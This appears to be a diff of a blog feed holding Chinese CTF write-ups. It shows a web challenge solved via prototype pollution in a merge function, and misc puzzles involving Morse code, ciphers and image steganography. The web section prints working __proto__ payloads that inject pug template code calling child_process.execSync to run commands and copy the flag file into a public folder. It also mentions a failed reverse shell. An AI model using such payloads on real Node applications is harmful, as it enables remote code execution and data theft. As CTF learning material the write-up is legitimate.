+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span> &lt;span class="nx">id&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">username&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s1">&amp;#39;admin&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">password&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;password_you_don&amp;#39;t_know&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">role&lt;/span>&lt;span class="o">:&lt;/span>&lt;span class="s1">&amp;#39;admin&amp;#39;&lt;/span> &lt;span class="p">},&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span> &lt;span class="nx">id&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="mi">2&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">username&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s1">&amp;#39;guest&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">password&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s1">&amp;#39;guest123&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">role&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s1">&amp;#39;user&amp;#39;&lt;/span> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">];&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>直接登录发现存在一个留言解密,审计源码发现逻辑如下.&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-js" data-lang="js">&lt;span class="line">&lt;span class="cl">&lt;span class="kr">static&lt;/span> &lt;span class="nx">merge&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">target&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">source&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">for&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kd">let&lt;/span> &lt;span class="nx">key&lt;/span> &lt;span class="k">in&lt;/span> &lt;span class="nx">source&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nb">Object&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">prototype&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">hasOwnProperty&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">call&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">source&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">key&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="k">typeof&lt;/span> &lt;span class="nx">source&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">key&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">===&lt;/span> &lt;span class="s1">&amp;#39;object&amp;#39;&lt;/span> &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> &lt;span class="nx">source&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">key&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">!==&lt;/span> &lt;span class="kc">null&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="o">!&lt;/span>&lt;span class="nx">target&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">key&lt;/span>&lt;span class="p">])&lt;/span> &lt;span class="nb">Object&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">assign&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">target&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="p">{&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="nx">key&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="p">{}&lt;/span> &lt;span class="p">});&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">merge&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">target&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">key&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="nx">source&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">key&lt;/span>&lt;span class="p">]);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span> &lt;span class="k">else&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">target&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">key&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">source&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">key&lt;/span>&lt;span class="p">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="nx">target&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">save&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">content&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">Message&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">merge&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">this&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">JSON&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">parse&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="sb">`{&amp;#34;id&amp;#34;:&lt;/span>&lt;span class="si">${&lt;/span>&lt;span class="nx">Message&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">messages&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">length&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="sb">,&amp;#34;content&amp;#34;: &lt;/span>&lt;span class="si">${&lt;/span>&lt;span class="nx">content&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="sb">}`&lt;/span>&lt;span class="p">));&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">Message&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">messages&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">push&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">this&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>显然是原型链,但是不知道应该去污染谁,卡了很久.
+后来在被废弃的pull请求中发现了下面的一个
+&lt;a class="link" href="https://github.com/pugjs/pug/pull/3428" target="_blank" rel="noopener"
+>https://github.com/pugjs/pug/pull/3428&lt;/a>
+遂写出payload&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">{&amp;#34;__proto__&amp;#34;:{&amp;#34;block&amp;#34;:{&amp;#34;type&amp;#34;: &amp;#34;Text&amp;#34;, &amp;#34;line&amp;#34;:&amp;#34;console.log(process.mainModule.require(&amp;#39;child_process&amp;#39;).execSync(&amp;#39;calc&amp;#39;).toString())&amp;#34;}}}
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>然而又遇到一个问题,这个东西疑似不出网,反正弹shell失败,读flag写到public中得到最后的flag&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">{&amp;#34;__proto__&amp;#34;:{&amp;#34;block&amp;#34;:{&amp;#34;type&amp;#34;: &amp;#34;Text&amp;#34;, &amp;#34;line&amp;#34;:&amp;#34;process.mainModule.require(&amp;#39;child_process&amp;#39;).execSync(&amp;#39;cat /flag_1s_hereeee&amp;gt;./public/js/flag.txt&amp;#39;)&amp;#34;}}}
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>访问&lt;code>/js/flag.txt&lt;/code> 即可.&lt;/p></description></item><item><title>编码系列</title><link>https://XiaoYuan-420.gituhub.io/p/%E7%BC%96%E7%A0%81%E7%B3%BB%E5%88%97/</link><pubDate>Mon, 28 Oct 2024 15:43:08 +0800</pubDate><author>2024211570@bupt.cn (XiaoYuan)</author><guid>https://XiaoYuan-420.gituhub.io/p/%E7%BC%96%E7%A0%81%E7%B3%BB%E5%88%97/</guid><description>&lt;h1 id="编码系列持续更新">编码系列(持续更新)
 &lt;/h1>&lt;h2 id="base家族">Base家族
 &lt;/h2>&lt;h3 id="base16">Base16
 &lt;/h3>&lt;ul>
@@ -681,8 +988,7 @@ I&amp;rsquo;ll be glad to translate responses, if you only use one or the other.
 &lt;h2 id="what-is-this">what is this?
 &lt;/h2>&lt;p>from binary得到&lt;/p>
 &lt;blockquote>
-&lt;p>ccc,ppppp,ccppcp,p,cccc,cpppp,ccc,ccppcp,cpppp,ccccc,ccppcp,pp,ppppp,cpc,ccccc,c,ccppcp,pcpc,ppppp,pcc,c,ccppcp,pcpcpp,pcpcpp&lt;/p>
-&lt;/blockquote>
+&lt;p>ccc,ppppp,ccppcp,p,cccc,cpppp,ccc,ccppcp,cpppp,ccccc,ccppcp,pp,ppppp,cpc,ccccc,c,ccppcp,pcpc,ppppp,pcc,c,ccppcp,pcpcpp,pcpcpp&lt;/p>&lt;/blockquote>
 &lt;p>将&lt;code>c&lt;/code>对应&lt;code>.&lt;/code>，&lt;code>p&lt;/code> 对应&lt;code>-&lt;/code> 得到&lt;code>S0_TH1S_15_M0R5E_C0DE_!!&lt;/code>&lt;/p>
 &lt;h2 id="别真给我开盒了哥">别真给我开盒了哥
 &lt;/h2>&lt;p>根据图片搜S3901找到&lt;a class="link" href="https://www.bilibili.com/video/BV1Wc411Z7cR/?share_source=copy_web&amp;amp;vd_source=aee69620965121d361d7a9f8a6c029aa&amp;amp;t=84" target="_blank" rel="noopener"
@@ -726,8 +1032,7 @@ I&amp;rsquo;ll be glad to translate responses, if you only use one or the other.
 &lt;h2 id="四妹你听我解释">四妹，你听我解释
 &lt;/h2>&lt;p>winhex打开在文件末尾(IEND后)得到密文的前半段，crc爆破图片原有长宽得到密文后半段，组合起来核心价值观解密得到flag&lt;/p>
 &lt;blockquote>
-&lt;p>密文：自由文明法治平等公正敬业公正友善公正公正自由自由和谐平等自由自由公正法治友善平等公正诚信文明公正民主公正诚信平等平等诚信平等法治和谐公正平等平等友善敬业法治富强和谐民主法治诚信和谐&lt;/p>
-&lt;/blockquote>
+&lt;p>密文：自由文明法治平等公正敬业公正友善公正公正自由自由和谐平等自由自由公正法治友善平等公正诚信文明公正民主公正诚信平等平等诚信平等法治和谐公正平等平等友善敬业法治富强和谐民主法治诚信和谐&lt;/p>&lt;/blockquote>
 &lt;p>&lt;code>BuildCTF{lao_se_p1}&lt;/code>&lt;/p>
 &lt;h2 id="白白的真好看">白白的真好看
 &lt;/h2>&lt;p>flag1:打开doc文件，在字体样式中把隐藏文字关了，得到第一部分&lt;code>BuildCTF{Th3_wh1t3&lt;/code>&lt;/p>
@@ -837,8 +1142,7 @@ I&amp;rsquo;ll be glad to translate responses, if you only use one or the other.
 &lt;h2 id="我太喜欢亢金星君了">我太喜欢亢金星君了！
 &lt;/h2>&lt;p>白图是分隔，黑图不用管&lt;/p>
 &lt;blockquote>
-&lt;p>-&amp;hellip; ..- .. .-.. -.. -.-. - ..-. &amp;mdash;-.&amp;ndash; .&amp;ndash; &amp;hellip;.- .&amp;mdash;- -.-. &amp;mdash; &amp;ndash; &amp;hellip;.- ..&amp;ndash;.- -. &amp;hellip;.- .&amp;ndash; ..&amp;ndash;.- ..-. .&amp;mdash;- &amp;hellip; &amp;hellip;. &amp;mdash;-.-&lt;/p>
-&lt;/blockquote>
+&lt;p>-&amp;hellip; ..- .. .-.. -.. -.-. - ..-. &amp;mdash;-.&amp;ndash; .&amp;ndash; &amp;hellip;.- .&amp;mdash;- -.-. &amp;mdash; &amp;ndash; &amp;hellip;.- ..&amp;ndash;.- -. &amp;hellip;.- .&amp;ndash; ..&amp;ndash;.- ..-. .&amp;mdash;- &amp;hellip; &amp;hellip;. &amp;mdash;-.-&lt;/p>&lt;/blockquote>
 &lt;p>&lt;code>BUILDCTFW41COM4_N4W_F1SH&lt;/code>&lt;/p>
 &lt;h2 id="blackwhite">Black&amp;amp;White
 &lt;/h2>&lt;p>文件夹里有1089张纯黑/纯白的方形图片，猜测可以拼成33*33的二维码。&lt;/p>
@@ -879,8 +1183,7 @@ I&amp;rsquo;ll be glad to translate responses, if you only use one or the other.
 &lt;blockquote>
 &lt;p>输入：声音信号&lt;/p>
 &lt;p>输出：文字&lt;/p>
-&lt;p>这个函数很复杂，人类无法编写出，让机器自己找到这个函数的过程便是机器学习&lt;/p>
-&lt;/blockquote>
+&lt;p>这个函数很复杂，人类无法编写出，让机器自己找到这个函数的过程便是机器学习&lt;/p>&lt;/blockquote>
 &lt;/li>
 &lt;li>图像识别&lt;/li>
 &lt;li>阿尔法狗&lt;/li>
